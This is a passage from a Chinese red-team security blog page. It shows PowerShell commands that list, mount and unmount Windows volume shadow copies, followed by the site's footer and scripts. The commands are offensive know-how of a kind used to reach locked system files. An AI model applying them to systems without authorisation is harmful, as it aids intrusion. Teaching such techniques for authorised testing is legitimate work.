-<span class="hljs-keyword">Volume</span><span class="bash"> C:\</span></code></pre><p>列出卷影</p><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-VolumeShadowCopy</span></code></pre><p>挂载卷影</p><pre><code class="hljs taggerscript">Mount-VolumeShadowCopy -Path C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>ublic -DevicePath <span class="hljs-symbol">\\</span>?
<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy1   可直接在挂载点操作了</code></pre><p>卸载卷影</p><pre><code class="hljs taggerscript">Remove-VolumeShadowCopy -DevicePath <span class="hljs-symbol">\\</span>?
<span class="hljs-symbol">\G</span>LOBALROOT<span class="hljs-symbol">\D</span>evice<span class="hljs-symbol">\H</span>arddiskVolumeShadowCopy1</code></pre></div><hr><div><div class="post-metas mb-3"><div class="post-meta mr-3"><i class="iconfont icon-category"></i> <a class="hover-with-bg" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a class="hover-with-bg" href="/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a> <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/">渗透攻击红队百科全书</a></div></div><p class="note note-warning"><strong>本文作者: </strong><a href="/">iceH</a><br><strong>本文链接: </strong><a href="http://www.secice.cn/p/5a00e178">http://www.secice.cn/p/5a00e178</a><br><strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p><div class="post-prevnext row"><article class="post-prev col-6"><a href="/p/f6d90fce"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">Golang学习之基本类型与流程控制</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/p/efc8f01a"><span class="hidden-mobile">红队攻防学习之权限维持</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article class="comments" id="comments"><div id="vcomments"></div><script type="text/javascript">Fluid.utils.waitElementVisible("vcomments",(function(){Fluid.utils.createScript("https://cdn.staticfile.org/valine/1.4.14/Valine.min.js",(function(){new Valine({el:"#vcomments",app_id:"MnjV8raNBztIVGGKiicFL3Sq-MdYXbMMI",app_key:"hS70MmgmzDqbMSkSAfkDe42h",placeholder:"留下你的小脚印吧...",path:window.location.pathname,avatar:"wavatar",meta:["nick","mail"],pageSize:"10",lang:"zh-CN",highlight:!1,recordIP:!1,serverURLs:""})}))}))</script><noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a></noscript></article></article></div></div></div><div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p><div class="toc-body" id="toc-body"></div></div></div></div></div><div class="col-lg-7 mx-auto nopadding-md"><div class="container custom post-custom mx-auto"><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/img/psb.gif" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:300px;height:150px"></div></div><a id="scroll-top-button" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer class="text-center mt-5 py-3"><div class="footer-content"><span>iceH</span> <i class="iconfont icon-love"></i> <span>一条啥也不会的咸鱼！</span></div></footer><script src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:200}),NProgress.start(),document.addEventListener("DOMContentLoaded",(function(){window.NProgress&&window.NProgress.inc()})),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js"></script><script src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js"></script><script src="/js/debouncer.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="/js/lazyload.js"></script><script src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js"></script><script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script><script src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js"></script><script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script><script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script><script>!function(t,i){(0,Fluid.plugins.typing)(i.getElementById("subtitle").title)}(window,document)</script><script src="/js/local-search.js"></script><script>document.querySelector("#local-search-input").onclick=function(){searchFunc("/local-search.xml","local-search-input","local-search-result"),this.onclick=null}</script><script src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/js/qipao.js"></script><script src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/js/jingtaisidai.js"></script><script src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/js/dianjichuzi.js"></script><script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="/js/boot.js"></script></body></html>